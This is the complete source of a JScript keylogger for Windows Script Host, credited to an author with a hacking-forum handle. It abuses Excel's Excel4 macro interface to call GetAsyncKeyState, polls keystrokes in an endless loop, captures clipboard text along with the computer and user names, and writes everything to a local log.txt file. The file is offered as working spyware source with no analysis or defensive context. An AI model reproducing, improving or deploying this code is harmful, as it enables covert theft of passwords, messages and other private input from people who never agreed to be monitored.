// coded by darksel0  ....2024
//https://github.com/Darksel0
//hackforums.net username:darkosel
var fso = new ActiveXObject("Scripting.FileSystemObject");
var ExcelApp = new ActiveXObject("Excel.Application");
var shell = new ActiveXObject("WScript.Shell");

var datos = "Computer Name: " + shell.ExpandEnvironmentStrings("%computername%") + "\n";
datos += "Username: " + shell.ExpandEnvironmentStrings("%username%") + "\n";
datos += "Date and Time: " + new Date().toString() + "\n";
datos += new Array(131).join("=") + "\n";

var log = "";
var conta = 0;
var may = 0;
var lastClipboardContent = ""; 
var directory = shell.CurrentDirectory;


var keyCodes = [32, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 
                 84, 85, 86, 87, 88, 89, 90, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 192, 
                 189, 187, 219, 221, 220, 186, 222, 188, 190, 191, 9, 13, 17, 18, 20, 27, 
                 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 91, 112, 113, 114, 115, 116, 117, 
                 118, 119, 120, 121, 122, 123, 144, 145];

var chars = [" ", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", 
              "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", 
              "4", "5", "6", "7", "8", "9", "0", "`", "-", "=", "[", "]", "\\", ";", 
              "'", ",", ".", "/", "\t", "\n", "\r", "Ctrl", "Alt", "CapsLock", "Esc", 
              "PageUp", "PageDown", "End", "Home", "Left", "Up", "Right", "Down", "Ins", 
              "Del", "Win", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", 
              "F11", "F12", "NumLock", "ScrollLock"];

var uppercaseChars = [" ", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", 
                       "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "!", 
                       "@", "#", "$", "%", "^", "&", "*", "(", ")", "`", "_", "+", "{", "}", 
                       "|", ":", "\"", "<", ">", "?", "\t", "\n", "\r", "Ctrl", "Alt", 
                       "CapsLock", "Esc", "PageUp", "PageDown", "End", "Home", "Left", 
                       "Up", "Right", "Down", "Ins", "Del", "Win", "F1", "F2", "F3", 
                       "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", 
                       "NumLock", "ScrollLock"];

while (true) {
    if (conta >= 10) {
        conta = 0;
        if (fso.FileExists("log.txt")) {
            fso.DeleteFile("log.txt");
        }
        var f = fso.CreateTextFile("log.txt", true);
        f.Write(datos);
        f.Write(log);

       
        var clipboardContent = getClipboardText();
        if (clipboardContent !== lastClipboardContent) { 
            log += "\nClipboard Content: " + clipboardContent + "\n";
            lastClipboardContent = clipboardContent; 
        }

        f.Write(log);
        f.Close();
    }

    conta++;
    var api = 0;

    if (isKeyPressed(8)) { 
        if (log.length > 0) {
            log = log.substring(0, log.length - 1);
        }
    }

    if (isKeyPressed(20)) {  
        may = may ? 0 : 1;
    }

    otherKeys();
    terminateShortcut(); 
}

function isKeyPressed(keyValue) {
    var cmd = 'CALL("user32.dll", "GetAsyncKeyState", "JJ", ' + keyValue + ')';
    var api = ExcelApp.ExecuteExcel4Macro(cmd);
    return (api !== 0);
}

function otherKeys() {
    for (var i = 0; i < keyCodes.length; i++) {
        if (isKeyPressed(keyCodes[i])) {
            var char = isKeyPressed(16) ? uppercaseChars[i] : chars[i]; 
            log += char;
        }
    }
}

function terminateShortcut() {
    if (isKeyPressed(16) && isKeyPressed(18) && isKeyPressed(84)) {
        WScript.Echo("The program has been terminated");
        WScript.Quit();
    }
}

function getClipboardText() {
    var clipboardData = new ActiveXObject("htmlfile").parentWindow.clipboardData;
    return clipboardData.getData("Text");
}
